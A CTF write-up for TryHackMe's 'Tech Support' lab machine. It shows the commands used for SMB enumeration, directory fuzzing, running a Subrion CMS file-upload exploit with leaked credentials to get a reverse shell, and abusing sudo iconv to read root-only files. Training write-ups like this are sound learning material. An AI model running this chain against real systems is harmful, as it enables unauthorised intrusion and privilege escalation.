---
title: "Tech Support - TryHackMe Writeup"
date: 2026-07-17
draft: false
summary: "Writeup for Tech Support challenge on TryHackMe."
tags: ["web", "hardcoded creds", "linux", "file upload", "rce", "sudo"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/techsupport/cover.webp"
  caption: "Tech Support TryHackMe Challenge"
  alt: "Tech Support cover"
platform: "TryHackMe"
author: "Moiz Bootwala"
---

Hack into the scammer's under-development website to foil their plans.
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/techsupp0rt1

## Reconnaissance

I performed an `nmap` aggressive scan to find open ports on the target.

```
nmap -A -p- TARGET --min-rate 10000 -oN techsupport.nmap
```

![performing an nmap scan on techsupport machine](https://cdn.ziomsec.com/techsupport/1.webp)

## Capturing The Flag

I scanned SMB and found an open share:

```
smbmap -H TARGET
```

![listing open shares](https://cdn.ziomsec.com/techsupport/2.webp)

Downloading the file containing credentials.

```
smbclient //TARGET/websvr
```

![downloading the file from SMB share](https://cdn.ziomsec.com/techsupport/3.webp)

Accessing the web application

![accessing web application](https://cdn.ziomsec.com/techsupport/4.webp)

Since the web app only had a default landing page, I used `ffuf` to fuzz for hidden directories:

```
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![fuzzing for hidden directories](https://cdn.ziomsec.com/techsupport/5.webp)

I then accessed the test and wordpress endpoint but didn't find anything useful.

![accessing the test endpoint](https://cdn.ziomsec.com/techsupport/6.webp)

![accessing the wordpress endpoint](https://cdn.ziomsec.com/techsupport/7.webp)

The credentials revealed an encoded password. So, I decoded it using **CyberChef**.

![decoding the encoded credentials](https://cdn.ziomsec.com/techsupport/8.webp)

One of the wordpress blogs also revealed a valid user called *support*

![discovering a wordpress user](https://cdn.ziomsec.com/techsupport/9.webp)

I tried using the discovered user and the password found in the SMB share on the wordpress login page but it didn't work.

![attempting to log into wordpress](https://cdn.ziomsec.com/techsupport/10.webp)

I used **ffuf** to then discover files inside the `subrion` endpoint that was mentioned in the note found in SMB share.

```
ffuf -u http://TARGET/subrion/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -t 100 -mc 200
```

![fuzzing for directories inside subrion](https://cdn.ziomsec.com/techsupport/11.webp)

I accessed the `panel` and found the admin login.

![accessing the login panel](https://cdn.ziomsec.com/techsupport/12.webp)

I searched exploit-db for exploits related to the subrion CMS version and found a fileupload to RCE exploit.

```
searchsploit 'subrion 4.2.1'
```

![searching for exploits using searchsploit](https://cdn.ziomsec.com/techsupport/13.webp)

I tried using the credentials found from SMB and logged in successfully.

![logging into the CMS](https://cdn.ziomsec.com/techsupport/14.webp)

I downloaded the exploit and inspected it. Since I had all the prerequisites to run it, I ran it to get a reverse shell.

```
searchsploit -m php/webapps/49876.py
cat 49876.py
```

![downloading the exploit](https://cdn.ziomsec.com/techsupport/15.webp)

```
python3 49876.py -u http://TARGET/subrion/panel/ -l admin -p Scam2021
```

![getting a reverse shell](https://cdn.ziomsec.com/techsupport/16.webp)

I found the credentials for the *support* user by reading the *`wp-config.php`*.

```
cat ../../wordpress/wp-config.php
```

![reading wp-config file](https://cdn.ziomsec.com/techsupport/17.webp)

![discovering user creds](https://cdn.ziomsec.com/techsupport/18.webp)

Since this shell was pretty restrictive, I started a netcat listener and got another bash shell using python.

![getting a bash reverse shell](https://cdn.ziomsec.com/techsupport/19.webp)

![getting a bash reverse shell](https://cdn.ziomsec.com/techsupport/20.webp)

I then used the discovered credentials to switch to the *scamsite* user

```
su scamsite
```

![](https://cdn.ziomsec.com/techsupport/21.webp)

I then listed my sudo privs and found that I was allowed to run `iconv` as **sudo**

```
sudo -l
```

![](https://cdn.ziomsec.com/techsupport/22.webp)

I found a way to exploit this to read the root flag on **gtfobins**:
- https://gtfobins.org/gtfobins/iconv/

```
sudo iconv -f 8859_1 -t 8859_1 /root/root.txt
```

![](https://cdn.ziomsec.com/techsupport/23.webp)

That's it from my end! Until next time.

---